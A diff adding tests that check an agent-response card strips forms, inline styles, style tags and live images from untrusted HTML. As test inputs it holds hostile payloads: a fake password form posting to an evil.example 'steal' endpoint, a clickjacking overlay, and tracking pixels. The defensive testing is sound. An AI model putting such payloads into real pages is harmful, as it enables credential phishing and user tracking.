@@ -37,6 +37,72 @@ describe("AgentResponseCard — untrusted HTML", () => {
     );
     expect(container.querySelector("iframe")).toBeNull();
   });
+
+  it("strips forms, form controls and inline style on the allowHtml path", () => {
+    // A fake login form or a restyled overlay drawn from agent output is a
+    // phishing / clickjacking surface even without script.
+    const formHtml =
+      '<form action="https://evil.example/steal">' +
+      '<input name="password" type="password">' +
+      '<button>Sign in</button>' +
+      '<textarea></textarea><select></select>' +
+      '</form>' +
+      '<p style="position:fixed;inset:0;background:#000">overlay</p>';
+    const { container } = renderWithProviders(
+      <AgentResponseCard entry={{ ...baseEntry, content: formHtml }} allowHtml />
+    );
+    expect(container.querySelector("form")).toBeNull();
+    expect(container.querySelector("input")).toBeNull();
+    expect(container.querySelector("button")).toBeNull();
+    expect(container.querySelector("textarea")).toBeNull();
+    expect(container.querySelector("select")).toBeNull();
+    // Inline style must be dropped so agent output cannot restyle the page.
+    expect(container.querySelector("[style]")).toBeNull();
+  });
+
+  it("strips nested <style> elements on the allowHtml path", () => {
+    const styleHtml =
+      "<div><style>body{display:none}</style><p>visible</p></div>" +
+      "<svg><style>*{visibility:hidden}</style></svg>";
+    const { container } = renderWithProviders(
+      <AgentResponseCard entry={{ ...baseEntry, content: styleHtml }} allowHtml />
+    );
+    expect(container.querySelector("style")).toBeNull();
+    expect(container.textContent).not.toContain("display:none");
+    expect(screen.getByText("visible")).toBeInTheDocument();
+  });
+
+  it("renders a raw <img> as a link, not a live image, on the allowHtml path", () => {
+    const imgHtml =
+      '<p>see <img src="https://evil.example/pixel.png" alt="chart"></p>' +
+      '<img src="data:image/png;base64,AAAA">' +
+      '<video poster="https://evil.example/poster.png"><source src="https://evil.example/v.mp4"></video>' +
+      '<table background="https://evil.example/bg.png"><tr><td>x</td></tr></table>';
+    const { container } = renderWithProviders(
+      <AgentResponseCard entry={{ ...baseEntry, content: imgHtml }} allowHtml />
+    );
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.querySelector("video")).toBeNull();
+    expect(container.querySelector("source")).toBeNull();
+    expect(container.querySelector("[background]")).toBeNull();
+    const link = container.querySelector('a[href="https://evil.example/pixel.png"]');
+    expect(link).not.toBeNull();
+    expect(link?.textContent).toBe("chart");
+    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
+    // A non-http(s) source is reduced to its label, never linked.
+    expect(container.querySelector('a[href^="data:"]')).toBeNull();
+  });
+
+  it("renders a markdown image as a link, not a live <img>", () => {
+    const { container } = renderWithProviders(
+      <AgentResponseCard
+        entry={{ ...baseEntry, content: "![pixel](https://evil.example/pixel.png)" }}
+      />
+    );
+    expect(container.querySelector("img")).toBeNull();
+    const link = container.querySelector('a[href="https://evil.example/pixel.png"]');
+    expect(link).not.toBeNull();
+  });
 });
 
 describe("AgentResponseCard", () => {
